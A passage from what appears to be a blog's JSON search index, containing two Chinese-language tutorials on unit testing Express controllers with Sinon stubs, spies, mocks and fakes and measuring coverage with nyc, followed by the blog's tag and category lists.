stub 的動作而這兩個檔案在獨立分別跑測試的時候是會成功的但一起執行的時候卻會爆出以下的錯誤TypeError: Attempted to wrap which is already wrapped代表說，我們對同一個 object 重複做了 wrap 可到個人的 github 下載程式，並執行 npm run w1就可以看到錯誤訊息了 要解決這個問題的話我們必須透過 stub 指定的 method再加上透過 restore 的方式釋放被 wrapped 物件的方法如果不 restore 的話，物件就會一直是 wrappred 的狀態然後就一直沒有辦法回復到原本物件應該有的狀態所以更改過後程式碼如下12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879// login.test.jslet apiServiceLogindescribe(\"[登入功能]\", () =&gt; { before(() =&gt; { apiServiceLogin = sinon.stub(apiService, \"login\"); }) after(() =&gt; { apiServiceLogin.restore(); }) it(\"登入成功\", async () =&gt; { const req = mockRequest({ username: \"123\" }) const res = mockResponse(); apiServiceLogin.withArgs(\"123\").resolves({ status: 0 }); await loginController.run(req, res) sinon.assert.calledWith(res.json, { message: \"登入成功\", }); sinon.assert.calledOnce(res.json); }) it(\"登入錯誤\", async () =&gt; { const req = mockRequest({ username: \"123\" }) const res = mockResponse(); apiServiceLogin.withArgs(\"123\").resolves({ status: -1 }); await loginController.run(req, res) sinon.assert.calledWith(res.json, { message: \"登入失敗\", }); sinon.assert.calledOnce(res.json); })})// register.test.jslet apiServiceRegisterStub;describe(\"[註冊功能]\", () =&gt; { before(() =&gt; { apiServiceRegisterStub = sinon.stub(apiService, \"register\"); }) after(() =&gt; { apiServiceRegisterStub.restore(); }) it(\"註冊成功\", async () =&gt; { const req = mockRequest({ username: \"123\" }) const res = mockResponse(); apiServiceRegisterStub.withArgs(\"123\").resolves({ status: 0 }) await registerController.run(req, res) sinon.assert.calledWith(res.json, { message: \"註冊成功\", }); sinon.assert.calledOnce(res.json); }) it(\"註冊錯誤\", async () =&gt; { const req = mockRequest({ username: \"123\" }) const res = mockResponse(); apiServiceRegisterStub.withArgs(\"123\").resolves({ status: -1 }) await registerController.run(req, res) sinon.assert.calledWith(res.json, { message: \"註冊失敗\", }); sinon.assert.calledOnce(res.json); })}) 主要著手解決的地方在於兩點 before -&gt; 把 stub 的地方改放這 (不過個人實驗過，不放這也沒問題，放這只是比較有統一性) after -&gt; 加上 restore，在做完測試的時候把整個物件給釋放出來這點如果沒有做到的話，會導致在另一個 xxx.test.js 在使用同一個物件的方法時爆出已經被 wrapped 過後的錯誤訊息 可在個人專案下執行 npm run w2 即可看到錯誤訊息裡面的範例是把 login.test.js restore 給註解掉後故意讓 register.test.js 去對 login 做 stub 而不是 register此時因為 login.test.js 做過一次 stubregister.test.js 再做一次 stub 就會出現錯誤了成功的結果可以執行 npm run c1 看到 檢測 API URI透過 sinon.stub 的 withArgs 功能可以確定當我們程式在執行的時候，所呼叫的 api URI 是否正確123axiosPostStub.withArgs(\"http://localhost:7070/api/login\", data).resolves({ status: 0})當程式呼叫錯誤的 API URI 的時候就不會回傳我們預設給的回傳值就會導致程式後續失敗，這就是反向驗證了我們 API URI 是否正確的方式 可在個人專案下執行 npm run c2 即可看到結果 驗證 axios 的攔截器有時候我們會為 axios 加上攔截功能但如果要測試攔截功能，就又必須要有 server 才能辦到此時可以在 test case 裡面加上 http.createServer 做到這件事情12345678910111213141516171819202122232425262728293031323334// network.jsconst axios = require(\"axios\");axios.interceptors.request.use((config) =&gt; { console.log((\"do something for request\")); return config;});axios.interceptors.response.use((response) =&gt; { console.log((\"do something for response\")); return response.data;});module.exports = axios;// network.test.jslet server;describe(\"[network 功能]\", () =&gt; { afterEach(() =&gt; { server.close(); server = null; }) it(\"測試攔截功能(interceptors)\", (done) =&gt; { server = http.createServer((req, res) =&gt; { const data = {a:1} res.end(JSON.stringify(data)); }).listen(4000, () =&gt; { network.post(\"http://localhost:4000\").then((data) =&gt; { done(); }) }) })}); 配置好以上程式之後，可以在 terminal 看到兩個 console.log 的訊息這就代表我們的攔截器有被執行到個人認為攔截器測試獨立寫出來一個就可以不用特地讓其他測試案例都一定要執行到這功能，不然就不叫 unit test 了 可在個人專案下執行 npm run c3 即可看到結果 測試 callback function有些時候我們會需要把一些在用 callback function 的程式包起來改用 Promise 的方法使用，如下123456789101112131415161718const obj = { test: function(data, callback) { callback(data); }}const test = () =&gt; { return new Promise((res, rej) =&gt; { obj.test(\"qqqq\", (data) =&gt; { res(data) }) })}async function main() { let data = await test(); console.log(data);}main()// qqqq 在這種 callback 底下，可以透過 sinon.yields 去進行測試sinon.yields 的功能，就是可以強制讓你的 callback 被執行而不會去執行原本 function 內 callback 應該要執行的內容而且後面所帶的參數會變成你設定在 yields(data1, data2) 後面的 data1 data2這邊展示一個範例1234567891011const obj = { test: function(data, callback) { console.log(\"running\"); callback(data); }}obj.test(\"test\", (data) =&gt; { console.log(data);})// running// test 讓我們把程式加上 sinon.yield 試試看123456789101112const sinon = require(\"sinon\")const obj = { test: function(data, callback) { console.log(\"running\"); callback(data); }}sinon.stub(obj, \"test\").yields(1)obj.test(\"test\", (data) =&gt; { console.log(data);})// 1 程式會 log 出 1 這個值但是 running 並不會執行到非常符合 stub 的原則，就是會覆寫 function 原本的行為然後再透過 yields 的方法，可以直接你所撰寫觸發 callback 的行為而不會去執行 obj.test function 本身的行為 所以依此類推，我在後面多加幾個參數原本的 callback 回來的參數只會有一個，其餘為 undefined12345678910111213const obj = { test: function(data, callback) { callback(data); }}obj.test(\"test\", (data1, data2, data3) =&gt; { console.log(\"data1: \" + data1); console.log(\"data2: \" + data2); console.log(\"data3: \" + data3);})// data1: test// data2: undefined// data3: undefined 但是如果透過 sinon.yields 去強制給於另外兩個參數呢?123456789101112131415const sinon = require(\"sinon\")const obj = { test: function(data, callback) { callback(data); }}sinon.stub(obj, \"test\").yields(1, 2, 3)obj.test(\"test\", (data1, data2, data3) =&gt; { console.log(\"data1: \" + data1); console.log(\"data2: \" + data2); console.log(\"data3: \" + data3);})// data1: 1// data2: 2// data3: 3 callback 的時候，另外兩個參數也會跟著進來 那透過把 callback 包成 promise 的案例又該怎麼測試呢?範例如下，必須在執行 function 之前先加上 sinon.stub(obj, &quot;test&quot;).yields(1) 就可以了1234567891011121314151617181920const sinon = require(\"sinon\")const obj = { test: function(data, callback) { callback(data); }}sinon.stub(obj, \"test\").yields(1)const test = () =&gt; { return new Promise((res, rej) =&gt; { obj.test(\"qqqq\", (data) =&gt; { res(data) }) })}async function main() { let data = await test(); console.log(data);}main()// 1 (因為已經被 yields 改成 1 了) 測試涵蓋率 (test coverage)做測試的時候當然少不了 test coveragenode.js 有一款叫做 nyc 的可以檢測 test coverage配製方法非常簡單，以下兩個步驟即可 下載 nyc npm install nyc 把 nyc 放置於 mocha 前面 nyc mocha ....如果要想看 html 結構的報告的話，nyc --reporter=lcov --reporter=text-summary mocha ... 可在個人專案下執行 npm run nyc 即可看到結果 結語以上介紹幾個在實際撰寫 unit test 會遇到的困難點以及解決方法未來還有遇到的話，會在陸陸續續補上來！","link":"/2019/12/22/unit-test-express-implement-troubleshooting/"},{"title":"unit test 是什麼? 又該如何在 express 開發上實作 unit test?","text":"前言[2019-12-22 Update]在express unit test 一些技巧教學以及困難點裡面有針對一些技巧做說明以及增加測試涵蓋率的使用方式 在很久很久之前有提到過 unit test但那時候只有針對簡單到不能在簡單的 function 進行 unit test想必大家一定也不太了解 unit test 究竟要怎麼用在真正開發上面 在真正開發上面要用到 unit test一定會牽扯到讀取資料庫、讀取檔案、呼叫 API 等等複雜邏輯難道在做測試的時候，我還要確保我的 API 可以呼叫資料庫可以進行連線等等後，我才能確認我的程式是否正確嗎?在這種情況下要做 unit test 真的是一件不簡單的事情更別說 test cases 跑到一半有人把你測試環境的 database 亂改動，或是 API Server 的分支改掉這種鳥事了… 這樣的話，究竟要透過什麼樣的方式可以去做到 unit test 呢?其實可以透過 mock 的機制，讓呼叫 API 回傳值回傳一個固定值，而並不需要去真正呼叫 API 這裡所說的 mock 只是 unit test 使用到的一種方式其他還包含 spy 、stub、fake 等等我們通常稱這些為 test double (測試替身)以下會先介紹剛剛提到的 test double 題外話，一開始看到這名詞讓我一直想到 JOJO .. Test Double - 測試替身根據搞笑談軟功裡面其實有提到五種，但我這邊會介紹個人常見和常用到的四種 stub當程式是使用到 HTTP 相關操作的，為了測試相依性降到最低可以透過 stub 去變更發出 HTTP 程式的行為，變成不真的發出 HTTP，且可以自定義回傳的結果還有包含讀檔的行為也是如此，利用 stub 取代真的讀檔的行為，使測試可以更關注在程式邏輯上面而一般使用 stub 都會寫死回傳的資訊，以方便後續測試 使用情景: [假資料回傳]HTTP Request, 讀檔, 讀取資料庫等等，後續程式還沒實作的狀況下可以用來測試程式邏輯 spy此 double 是用在去紀錄 function 的行為驗證上面被 spy 的 function 就像是被安插間諜一樣，會去收集行為function 也會真的被執行，並不會像 stub 一樣被取代掉以 function 裡面 post http 為例，此 post http 是會真的發送請求出去，但會被紀錄如果是用 stub 的話，post http 則是不會發送請求出去 使用情景: [行為驗證]因為程式是真的會執行，所以會專注在驗證程式執行的行為驗證上，例如驗證程式應該只能跑一次等等的行為上 想了解更詳細的可以讀讀 Sinon.js 的文件內容，擷取部分原文如下 A test spy is a function that records arguments, return value, thevalue of this and exception thrown (if any) for all its calls.from Sinon Spy mockMock Object 則是類似於 spy 以及 stub 的集合體本身擁有可以取代物件的方法 (stub)，且內建 expect 方法可以驗證執行的行為是否正確 (spy)如果只是單純要讓後續程式邏輯接受固定值的話，用 stub 即可如果只是單純要驗證程式的行為，用 spy 即可但如果是以上兩個混合的狀況下，則是建議使用 Mock 使用情景: [行為驗證,假資料回傳]當需要驗證 HTTP POST 是否有根據所需參數進行執行，但又不想要真的發出 HTTP 的時候可以使用，跟 spy 最大差別在於 spy 是會真的執行程式，但 Mock 是不會真的去執行 想了解更詳細的可以讀讀 Sinon.js 的文件內容，擷取部分原文如下 Mocks (and mock expectations) are fake methods (like spies) with pre-programmed behavior (like stubs) as well as pre-programmed expectations.Mocks should only be used for the method under test. In every unit test, there should be one unit under test.In general you should have no more than one mock (possibly with several expectations) in a single test.from Sinon Mock fake此物件並不像是 spy 或是 stub 會取代程式裡面的行為而是建立一個實際可執行的 function，通常是用在建立 XHR or Server or Database 上面，但會是以更簡化的方式去實現例如原本可能是一個寄信的程式，但因為寄信驗證這件事情本身不好處理這邊可以做出一個 fake Object 是把寄信的訊息內容，改成寫檔，已達成寄信行為的驗證 使用情境：[簡化程式]簡化寄信，或是簡化 DB 連線改用 In-memory 的方式等等，目的就是要簡化 prodcution code 的複雜度 想了解更詳細的可以讀讀 Sinon.js 的文件內容，擷取部分原文如下 the sinon.fake API knows only how to create fakes, and doesn’t concern itself with plugging them into the system under test.To plug the fakes into the system under test, you can use the sinon.replace* methods.from Sinon Fake 小結結語要特別注意一件事情每一個測試框架針對這些 test double 可能會有一些些微的差距最好是針對測試框架裡面的文件進行閱讀去了解使用時機跟方式會比較恰當接下來就開始介紹關於 Sinon 這個測試框架的程式實作部分以及該如何搭配 express 進行 unit test 實作接下來會透過 express 搭配 sinon 進行 unit test 的說明首先我們會需要一個簡單的 express server此 server 功能有呼叫登入 API 以及寫檔兩種功能 為了方便進行 unit test 程式架構上，會進行拆分以模擬真實開發狀況登入的主要邏輯很單純1234567891011121314151617181920212223242526272829303132// server.js - listen 在 7070const authController = require(\"./authController\")app.post(\"/login\", authController.run);// authController.jsconst run = async (req, res) =&gt; { const { username } = {...req.body}; const result = await apiService.login(username) if (result.status !== 0) { return res.json({ message: \"登入失敗\" }) } return res.json({ message: \"登入成功\" })}// apiService.jsconst login = (username) =&gt; { return axios.post(\"http://localhost:7070/api\", { username, }).then((res) =&gt; res.data);}// 給 /login 用的, 不在測試範圍內app.post(\"/api\", (req, res) =&gt; { res.json({status: req.body.username === \"123\" ? 0 : 1})}) 在這種情況下要進行 unit test 必須要確保呼叫 apiService.login 是不會有任何問題的那如果要移除這層依賴，透過 test double 該如何對 authController.run 進行測試呢? Express with Sinon StubSinon Stub 介紹先介紹一下 Sinon Stub 如何使用，先看 code 1234const sinon = require(\"sinon\");const test = sinon.stub().returns(5);console.log(test());// 5 透過 stub 這個 function 接到的回傳值會是一個 function而這個 function 可以自定義呼叫的時候會有什麼樣的行為上面的範例中，我們讓他呼叫後得到的回傳是 5 那如果要得到類似 {status: 0} 這種結果呢? 方法如下123const test = sinon.stub().returns({status: 0});console.log(test());// {status: 0} 那如果說是要取代原本 function 的功能呢?1234567891011const sinon = require(\"sinon\");const obj = { test: function() { return \"this is test.\" }}console.log(obj.test());// \"this is test.\"sinon.stub(obj, \"test\").resolves({status: 0});console.log(obj.test());// Promise { { status: 0 } } 透過以上方法，obj 裡面的 test function 就被取代掉然後讓這個 function 回傳一個 promise.resolve 的結果 但如果說我的 function 要接收一個參數，然後指定回傳呢?12345678910111213const sinon = require(\"sinon\");const obj = { test: function(a) { return \"this is test: \" + a }}console.log(obj.test(\"test\"));// this is test: testsinon.stub(obj, \"test\").withArgs(\"123\").returns({status: 0});console.log(obj.test(\"123\"));// { status: 0 }console.log(obj.test());// undefined 透過 withArgs 可以設定，當這個 function 接收到什麼樣的參數的時候應該要回傳什麼樣的結果以上面的範例來說，只要這個 test function 的參數是 &quot;123&quot; 的話那他的回傳值就會是 { status: 0 }綜合以上的方法，就可以開始實作 unit test 了 如何在 express 上使用 stub回到正題因為是 express 的關係，所以 req 以及 res 的物件必須先透過 stub把 res 的行為先透過自訂義的方式給取代 這邊 req 不用的原因是，我們只取 req.body 的值所以可以直接當成 json 取值就好但 res 不能的原因是, express 再回傳的時候會需要多 call res.json() 來把值回傳回去 12345678910const mockRequest = (data) =&gt; { return { body: data }}const mockResponse = () =&gt; { const res = {}; res.json = sinon.stub().returns(res); return res;} 接下來正式的測試程式來了12345678910111213141516describe(\"[登入功能]\", () =&gt; { it(\"登入成功\", async () =&gt; { const req = mockRequest({ username: \"123\", }) const res = mockResponse(); sinon.stub(apiService, \"login\").withArgs(\"123\").resolves({ status: 0 }) await authController.run(req, res) sinon.assert.calledWith(res.json, { message: \"登入成功\", }); sinon.assert.calledOnce(res.json); })}) 透過使用 sinon.stub(apiService, &quot;login&quot;)可以把 apiService 裡面的 login function 實際行為給取消掉我們在後面定義了回傳一個 Promise.resolve 來指定被我們更改掉後應該回傳的資料也就是 sinon.stub(apiService, &quot;login&quot;).resolves(data) 裡面的 data這樣我們就可以讓 authController.run 裡面的 apiService.login不會真正去發送 POST Request，而是會回傳我們的結果執行 mocha 後的結果如下 接下來我們再增加一個 test case，程式碼如下12345678910111213141516171819202122232425262728293031323334const apiServiceLogin = sinon.stub(apiService, \"login\")describe(\"[登入功能]\", () =&gt; { beforeEach(() =&gt; { apiServiceLogin.reset() }) it(\"登入成功\", async () =&gt; { const req = mockRequest({ username: \"123\", }) const res = mockResponse(); apiServiceLogin.withArgs(\"123\").resolves({ status: 0 }) await authController.run(req, res) sinon.assert.calledWith(res.json, { message: \"登入成功\", }); sinon.assert.calledOnce(res.json); }) it(\"登入錯誤\", async () =&gt; { const req = mockRequest({ username: \"123\", }) const res = mockResponse(); apiServiceLogin.withArgs(\"123\").resolves({ status: 999 }) await authController.run(req, res) sinon.assert.calledWith(res.json, { message: \"登入失敗\", }); sinon.assert.calledOnce(res.json); })}) 這邊要注意，已經被取代掉的 function，行為已經被我們第一個 test case 給固定了為了要還原預設行為，必須在 beforeEach 加上 reset() 的方法去重置每一個 test case apiService.login 回傳的行為，結果如下 Express with Sinon SpySinon Spy12345const sinon = require(\"sinon\");const spy = sinon.spy();spy()console.log(spy.callCount);// 1 基本上所有測試替身呼叫後，都是會回傳一個可執行 function 回來根據前面介紹過，spy 是單純拿來做紀錄以及驗證上面的範例來說，就可以知道這個 function 被呼叫一次另外在 spy 的狀況下，function 實際行為是會被觸發，我們再來看另一段 code12345678910111213const sinon = require(\"sinon\");const obj = { test: function(a) { return \"this is test: \" + a }}const spy = sinon.spy(obj, \"test\");console.log(spy(\"hihi\"));// this is test: hihiconsole.log(obj.test(\"hihi2\"));// this is test: hihi2console.log(spy.callCount);// 2以上面的例子可以看到，程式實際上的邏輯是有被觸發成功的透過 spy 回傳的值，也是一個可執行的 function透過 spy() 或是 obj.test() 去觸發，都會被記錄起來 如何在 express 上使用 spy程式碼會增加一段對 username 進行 hash 再去做 login123456789101112131415161718192021// authControler.jsconst run = async (req, res) =&gt; { const { username } = {...req.body}; const result = await apiService.login(hash.sha256(username)) if (result.status !== 0) { return res.json({ message: \"登入失敗\" }) } return res.json({ message: \"登入成功\" })}// hash.jsconst sha256 = (username) =&gt; { const t = ctypto.createHash(\"sha256\"); return t.update(username, \"utf8\").digest(\"base64\");} 先來跑跑看 unit test 會發現結果是錯的原因是因為原本設定好 login 的時候，參數應該會是帶 &quot;123&quot;但因為變成 hash 之後會改成 &quot;pmWkWSBCL51Bfkhn79xPuKBKHz//H6B+mY6G9/eieuM=&quot;把 unit test 裡面的 withArgs 改成 apiServiceLogin.withArgs(&quot;pmWkWSBCL51Bfkhn79xPuKBKHz//H6B+mY6G9/eieuM=&quot;) 即可 此時我們想要針對 hash.sha256 進行次數監控1234567891011121314151617181920212223242526272829303132333435const hashSha256 = sinon.spy(hash, \"sha256\");beforeEach(() =&gt; { apiServiceLogin.reset() hashSha256.resetHistory() }) it(\"登入成功, hash 一次\", async () =&gt; { const req = mockRequest({ username: \"123\" }) const res = mockResponse(); apiServiceLogin.withArgs(\"pmWkWSBCL51Bfkhn79xPuKBKHz//H6B+mY6G9/eieuM=\").resolves({ status: 0 }) await authController.run(req, res) sinon.assert.calledWith(res.json, { message: \"登入成功\", }); sinon.assert.calledOnce(res.json); sinon.assert.calledOnce(hashSha256) }) it(\"登入錯誤, hash 一次\", async () =&gt; { const req = mockRequest({ username: \"123\" }) const res = mockResponse(); apiServiceLogin.withArgs(\"pmWkWSBCL51Bfkhn79xPuKBKHz//H6B+mY6G9/eieuM=\").resolves({ status: 999 }) await authController.run(req, res) sinon.assert.calledWith(res.json, { message: \"登入失敗\", }); sinon.assert.calledOnce(res.json); sinon.assert.calledOnce(hashSha256) }) 先在最前面加上 const hashSha256 = sinon.spy(hash, &quot;sha256&quot;); 取完成 spy 的動作然後在最後面加上了驗證 sinon.assert.calledOnce(hashSha256) 就可以完成驗證動作除此之外，要先在 beforeEach 加上 hashSha256.resetHistory() 去重置計算次數 Express with Sinon MockSinon Mock不同於 stub 以及 spy透過 mock 回傳的東西並不是一個可執行的 function而是要透過此 mock 去進行設定，類似『驗證』用的東西以及可以像是 stub 一樣，指定在 function 被呼叫的時候，應該會有什麼樣的回傳值但又不同於 stub 以及 spy，mock 並不能直接去針對某一個做 mock而是只能會對整個 obj 做 mock12345678910111213141516const sinon = require(\"sinon\");const obj = { test: function(a) { return \"this is test: \" + a }};const mock = sinon.mock(obj);// 驗證只能最多被呼叫 2 次mock.expects(\"test\").atLeast(2).returns({status: 1})console.log(obj.test());// { status: 1 }console.log(obj.test());// { status: 1 }mock.verify() 透過 mock.expects(&quot;test&quot;).atLeast(2).returns({status: 1}) 去設定預期哪一個 method 應該回傳什麼樣的值以及設定可被執行的次數最後再透過 mock.verify() 可以啟用這個 assertion除此之外，如果想要回復這個被 mock 原始的 method 的話可以透過 mock.restore() 去做回覆的動作這樣回覆之後，就會執行原本 function 的邏輯了 如何在 express 上使用 mock基本上程式碼跟上一個很像，但不一樣的地方在於我想要針對 apiService.js 去進行驗證，以及模擬回傳值12345678910111213141516171819202122232425262728293031const apiServiceLogin = sinon.mock(apiService);it(\"登入成功, hash 一次\", async () =&gt; { const req = mockRequest({ username: \"123\" }) const res = mockResponse(); apiServiceLogin.expects(\"login\").withArgs(\"pmWkWSBCL51Bfkhn79xPuKBKHz//H6B+mY6G9/eieuM=\").resolves({ status: 0 }).once(); await authController.run(req, res) sinon.assert.calledWith(res.json, { message: \"登入成功\", }); sinon.assert.calledOnce(res.json); sinon.assert.calledOnce(hashSha256) }) it(\"登入錯誤, hash 一次\", async () =&gt; { const req = mockRequest({ username: \"123\" }) const res = mockResponse(); apiServiceLogin.expects(\"login\").withArgs(\"pmWkWSBCL51Bfkhn79xPuKBKHz//H6B+mY6G9/eieuM=\").resolves({ status: -1 }).once(); await authController.run(req, res) sinon.assert.calledWith(res.json, { message: \"登入失敗\", }); sinon.assert.calledOnce(res.json); sinon.assert.calledOnce(hashSha256) }) 差別在於以下程式，透過 mock，可以去指定回傳值，以及可以兼顧驗證用的功能123apiServiceLogin.expects(\"login\").withArgs(\"pmWkWSBCL51Bfkhn79xPuKBKHz//H6B+mY6G9/eieuM=\").resolves({ status: -1}).once(); Express with Sinon FakeSinon Fake在 Sinon 官網上對於 Fake 的說明是一種把 spy 跟 stub 混合的一種形式所以這邊後面並不會介紹如何在 express 上面實作而是會針對這個 fake 功能做些簡單的範例而已 1234const sinon = require(\"sinon\");const fake = sinon.fake.returns({status: 1});console.log(fake());{ status: 1 } 跟 stub 一樣可以指定該 function 應該回傳的值但他也有可以取代原本 method 的功能，程式如下 123456789101112const sinon = require(\"sinon\");const obj = { test: () =&gt; { return \"test\"; }}const fake = sinon.fake.returns({status: 1});console.log(obj.test());// testsinon.replace(obj, \"test\", fake)console.log(obj.test());// { status: 1 } 透過 sinon.replace，可以取代掉原本 function 的實際邏輯 結語以上介紹完每一個 test double 的意思以及使用場景但使用場景上，我也還在思考什麼樣的場景可以搭配什麼去使用歡迎各位一起在下面留言進行討論未來會再針對實務上 unit test 遇到的困難再回來整理一篇 References https://www.sitepoint.com/sinon-tutorial-javascript-testing-mocks-spies-stubs/ https://dev.to/milipski/test-doubles---fakes-mocks-and-stubs https://codewithhugo.com/express-request-response-mocking/ https://tpu.thinkpower.com.tw/tpu/articleDetails/1294 http://kaczanowscy.pl/tomek/2011-01/testing-basics-sut-and-docs","link":"/2019/12/10/unit-test-express/"}],"tags":[{"name":"nodejs","slug":"nodejs","link":"/tags/nodejs/"},{"name":"session","slug":"session","link":"/tags/session/"},{"name":"cookie","slug":"cookie","link":"/tags/cookie/"},{"name":"cors","slug":"cors","link":"/tags/cors/"},{"name":"credential","slug":"credential","link":"/tags/credential/"},{"name":"aws","slug":"aws","link":"/tags/aws/"},{"name":"certificate","slug":"certificate","link":"/tags/certificate/"},{"name":"acm","slug":"acm","link":"/tags/acm/"},{"name":"apple pay","slug":"apple-pay","link":"/tags/apple-pay/"},{"name":"debug","slug":"debug","link":"/tags/debug/"},{"name":"iOS","slug":"iOS","link":"/tags/iOS/"},{"name":"safari","slug":"safari","link":"/tags/safari/"},{"name":"CloudWatch","slug":"CloudWatch","link":"/tags/CloudWatch/"},{"name":"express","slug":"express","link":"/tags/express/"},{"name":"x-forwarded-for","slug":"x-forwarded-for","link":"/tags/x-forwarded-for/"},{"name":"ip","slug":"ip","link":"/tags/ip/"},{"name":"nginx","slug":"nginx","link":"/tags/nginx/"},{"name":"architecture","slug":"architecture","link":"/tags/architecture/"},{"name":"CloudFront","slug":"CloudFront","link":"/tags/CloudFront/"},{"name":"query string","slug":"query-string","link":"/tags/query-string/"},{"name":"header","slug":"header","link":"/tags/header/"},{"name":"API Gateway","slug":"API-Gateway","link":"/tags/API-Gateway/"},{"name":"google hacking","slug":"google-hacking","link":"/tags/google-hacking/"},{"name":"search","slug":"search","link":"/tags/search/"},{"name":"ec2","slug":"ec2","link":"/tags/ec2/"},{"name":"disk","slug":"disk","link":"/tags/disk/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"security","slug":"security","link":"/tags/security/"},{"name":"lambda","slug":"lambda","link":"/tags/lambda/"},{"name":"upload file","slug":"upload-file","link":"/tags/upload-file/"},{"name":"download file","slug":"download-file","link":"/tags/download-file/"},{"name":"Test","slug":"Test","link":"/tags/Test/"},{"name":"Development","slug":"Development","link":"/tags/Development/"},{"name":"mocha","slug":"mocha","link":"/tags/mocha/"},{"name":"ngrok","slug":"ngrok","link":"/tags/ngrok/"},{"name":"localhost","slug":"localhost","link":"/tags/localhost/"},{"name":"js","slug":"js","link":"/tags/js/"},{"name":"JavaScript","slug":"JavaScript","link":"/tags/JavaScript/"},{"name":"this","slug":"this","link":"/tags/this/"},{"name":"vue","slug":"vue","link":"/tags/vue/"},{"name":"vuex","slug":"vuex","link":"/tags/vuex/"},{"name":"vue-router","slug":"vue-router","link":"/tags/vue-router/"},{"name":"todo-list","slug":"todo-list","link":"/tags/todo-list/"},{"name":"promise","slug":"promise","link":"/tags/promise/"},{"name":"callback","slug":"callback","link":"/tags/callback/"},{"name":"async","slug":"async","link":"/tags/async/"},{"name":"await","slug":"await","link":"/tags/await/"},{"name":"ssh","slug":"ssh","link":"/tags/ssh/"},{"name":"ssh tunnel","slug":"ssh-tunnel","link":"/tags/ssh-tunnel/"},{"name":"ecma6","slug":"ecma6","link":"/tags/ecma6/"},{"name":"security header","slug":"security-header","link":"/tags/security-header/"},{"name":"HTTPS","slug":"HTTPS","link":"/tags/HTTPS/"},{"name":"slack","slug":"slack","link":"/tags/slack/"},{"name":"bot","slug":"bot","link":"/tags/bot/"},{"name":"chat bot","slug":"chat-bot","link":"/tags/chat-bot/"},{"name":"network","slug":"network","link":"/tags/network/"},{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"Executor","slug":"Executor","link":"/tags/Executor/"},{"name":"Thread Pool","slug":"Thread-Pool","link":"/tags/Thread-Pool/"},{"name":"TheadPoolExecutor","slug":"TheadPoolExecutor","link":"/tags/TheadPoolExecutor/"},{"name":"TapPay","slug":"TapPay","link":"/tags/TapPay/"},{"name":"Payment Gateway","slug":"Payment-Gateway","link":"/tags/Payment-Gateway/"},{"name":"unit test","slug":"unit-test","link":"/tags/unit-test/"},{"name":"sinon","slug":"sinon","link":"/tags/sinon/"}],"categories":[{"name":"NodeJs","slug":"NodeJs","link":"/categories/NodeJs/"},{"name":"AWS","slug":"AWS","link":"/categories/AWS/"},{"name":"debug","slug":"debug","link":"/categories/debug/"},{"name":"Security","slug":"Security","link":"/categories/Security/"},{"name":"Google","slug":"Google","link":"/categories/Google/"},{"name":"Test","slug":"Test","link":"/categories/Test/"},{"name":"tool","slug":"tool","link":"/categories/tool/"},{"name":"JavaScript","slug":"JavaScript","link":"/categories/JavaScript/"},{"name":"Vue","slug":"Vue","link":"/categories/Vue/"},{"name":"Development","slug":"Development","link":"/categories/Development/"},{"name":"Bot","slug":"Bot","link":"/categories/Bot/"},{"name":"Java","slug":"Java","link":"/categories/Java/"},{"name":"Payment Gateway","slug":"Payment-Gateway","link":"/categories/Payment-Gateway/"}]}